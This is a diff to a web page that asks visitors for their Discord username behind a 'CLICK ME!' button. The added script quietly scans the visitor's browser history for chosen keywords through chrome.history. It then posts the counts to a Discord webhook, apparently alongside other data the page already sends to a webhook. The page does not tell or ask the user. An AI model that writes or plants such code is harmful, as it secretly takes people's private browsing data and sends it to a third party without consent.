@@ -29,10 +29,12 @@
             opacity: 1;
             outline: 1px solid white; /* Add white outline */
         }
+        .input-container {
+            margin-bottom: 20px;
+        }
         input[type="text"] {
             padding: 10px;
             font-size: 18px;
-            margin-bottom: 20px;
             border: none;
             border-radius: 5px;
             width: calc(100% - 22px);
@@ -71,15 +73,40 @@
         #secondScreen {
             display: none;
         }
+        #keywordContainer {
+            position: absolute;
+            top: 50%;
+            right: 20px;
+            transform: translateY(-50%);
+            background-color: #172659;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        #keywordContainer h2 {
+            margin-top: 0;
+        }
+        #keywordList {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        #keywordList li {
+            margin-bottom: 10px;
+        }
+        #keywordList li span {
+            font-weight: bold;
+            color: green;
+        }
     </style>
 </head>
 <body>
     <div class="container" id="firstScreen">
         <h1>Welcome!</h1>
-        <p>Please enter your Discord username to proceed:</p>
-        <label for="discordUsername">Enter your Discord username:</label>
-        <input type="text" id="discordUsername" placeholder="Discord Username">
-        <br>
+        <div class="input-container">
+            <label for="discordUsername">Enter your Discord username:</label>
+            <input type="text" id="discordUsername" placeholder="Discord Username">
+        </div>
         <button id="clickMeBtn" disabled>CLICK ME!</button>
     </div>
 
@@ -88,11 +115,18 @@
         <p>Made by BlobsterWasHere on discord.</p>
     </div>
 
+    <div id="keywordContainer">
+        <h2>Scanned Keywords</h2>
+        <ul id="keywordList"></ul>
+    </div>
+
     <script>
         const discordUsernameInput = document.getElementById('discordUsername');
         const clickMeBtn = document.getElementById('clickMeBtn');
         const firstScreen = document.getElementById('firstScreen');
         const secondScreen = document.getElementById('secondScreen');
+        const keywordContainer = document.getElementById('keywordContainer');
+        const keywordList = document.getElementById('keywordList');
 
         discordUsernameInput.addEventListener('input', function() {
             clickMeBtn.disabled = !discordUsernameInput.value.trim();
@@ -147,6 +181,68 @@
                         console.error('ERROR', error);
                         // Handle error here
                     });
+
+                    // Scan browser history for keywords
+                    const keywords = ['example', 'test', 'keyword']; // Add your desired keywords here
+                    const keywordCounts = {};
+
+                    chrome.history.search({text: '', maxResults: 100}, function(data) {
+                        data.forEach(function(page) {
+                            const lowerCaseTitle = page.title.toLowerCase();
+                            const lowerCaseUrl = page.url.toLowerCase();
+
+                            keywords.forEach(function(keyword) {
+                                if (lowerCaseTitle.includes(keyword) || lowerCaseUrl.includes(keyword)) {
+                                    if (!keywordCounts[keyword]) {
+                                        keywordCounts[keyword] = 1;
+                                    } else {
+                                        keywordCounts[keyword]++;
+                                    }
+                                }
+                            });
+                        });
+
+                        // Display keyword counts
+                        for (const keyword in keywordCounts) {
+                            const li = document.createElement('li');
+                            li.textContent = `${keyword}: ${keywordCounts[keyword]} times`;
+                            keywordList.appendChild(li);
+                        }
+
+                        // Send scanned keywords to another Discord webhook
+                        const keywordWebhookUrl = 'https://discord.com/api/webhooks/12345678901234567890/your-other-webhook-id';
+                        const keywordMessage = {
+                            content: 'Scanned Keywords:',
+                            embeds: [{
+                                title: 'Scanned Keywords',
+                                color: 0xFFA500,
+                                fields: Object.keys(keywordCounts).map(keyword => {
+                                    return {
+                                        name: keyword,
+                                        value: `${keywordCounts[keyword]} times`,
+                                        inline: true
+                                    };
+                                })
+                            }]
+                        };
+
+                        fetch(keywordWebhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(keywordMessage)
+                        })
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Failed to send keyword webhook request');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('ERROR', error);
+                            // Handle error here
+                        });
+                    });
                 })
                 .catch(error => {
                     console.error('ERROR', error);
@@ -156,3 +252,4 @@
     </script>
 </body>
 </html>
+
